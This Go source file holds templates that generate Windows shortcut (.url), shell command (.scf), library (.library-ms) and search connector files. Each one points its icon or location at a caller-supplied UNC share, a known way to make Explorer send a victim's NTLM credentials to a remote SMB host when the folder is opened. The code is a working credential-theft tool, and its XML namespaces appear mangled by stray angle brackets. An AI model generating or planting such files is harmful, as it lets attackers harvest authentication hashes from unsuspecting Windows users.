package Templates

import "fmt"

// Declare variables
var (
	urlFileTemplate string = `[InternetShortcut]
URL=%s
WorkingDirectory=%s
IconFile=\\%s\%%USERNAME%%.icon
IconIndex=1
`

	scFileTemplate string = `[Shell]
Command=2
IconFile=\\%s\%%USERNAME%%.ico
[Taskbar]
Command=ToggleDesktop
`

	libraryFileTemplate string = `
 <?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\%s\%s</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
`

	searchConnectorFileTemplate string = `<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="<http://schemas.microsoft.com/windows/2009/searchConnector>">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>%s</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>\\\\%s\%s</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\%s\%s</url>
    </simpleLocation>
</searchConnectorDescription>
`
)

// GetURLFileTemplate returns the template with placeholders replaced by provided values
func GetURLFileTemplate(url, workingDirectory, iconFile string) string {
	return fmt.Sprintf(urlFileTemplate, url, workingDirectory, iconFile)
}

// GetSCFileTemplate returns the template with placeholders replaced by provided values
func GetSCFileTemplate(iconFile string) string {
	return fmt.Sprintf(scFileTemplate, iconFile)
}

// GetLibraryFileTemplate returns the template with placeholders replaced by provided values
func GetLibraryFileTemplate(share, target string) string {
	return fmt.Sprintf(libraryFileTemplate, share, target)
}

// GetSearchConnectorFileTemplate returns the template with placeholders replaced by provided values
func GetSearchConnectorFileTemplate(target, share, description string) string {
	return fmt.Sprintf(searchConnectorFileTemplate, description, target, share, target, share)
}
